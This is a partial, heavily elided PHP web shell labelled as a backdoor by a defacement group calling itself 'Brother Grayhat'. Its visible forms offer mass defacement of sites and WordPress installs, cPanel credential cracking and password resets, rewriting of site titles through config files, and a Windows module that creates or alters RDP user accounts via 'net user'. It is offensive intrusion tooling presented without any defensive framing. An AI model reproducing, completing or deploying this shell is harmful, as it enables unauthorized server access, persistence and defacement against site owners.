...
$auth_pass = "c008a83f2904b6fa4bb923c4e93cf59b"; //  22XC
$color = "#00ff00";
...
<center>
<h1><marquee>team brother grayhat no index no party</marquee></h1>
<header>
	<pre>
...
?>
 <!DOTYPE html>
  ...
  <head>
  	    <title> Brother Grayhat </title>
     <meta name='author' content='Brother Grayhat'>
<meta charset="UTF-8">
<link href='https://fonts.googleapis.com/css?family=Kelly Slab' rel='stylesheet'>
<style type='text/css'>
html {
...
<?php
###############################################################################
// Shell bacdour by Brother Grayhat
//Tn Tandex
// Tn patexkah
//Tn syntax
// Tn felix
// No index no party hahahah !!!
###############################################################################
function w($dir,$perm) {
	if(!is_writable($dir)) {
...
if($_GET['logout'] == true) {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Brother grayhat</textarea><br>
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Tandex' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Tandex' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Brother Grayhat</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Brother Grayhat' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Tandex'><br>
		<u>Domains</u>: <br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Brother Grayhat' required><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Grayhat brother' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>Tandex</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='Grayhat brother' required>
			<input type='text' name='pass' placeholder='password' value='Grayhat brother' required>
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://wa.me/+6289519293721' target='_blank'><font color=lime>Brothergrayhat</font></a></center>";
}
?>
</html>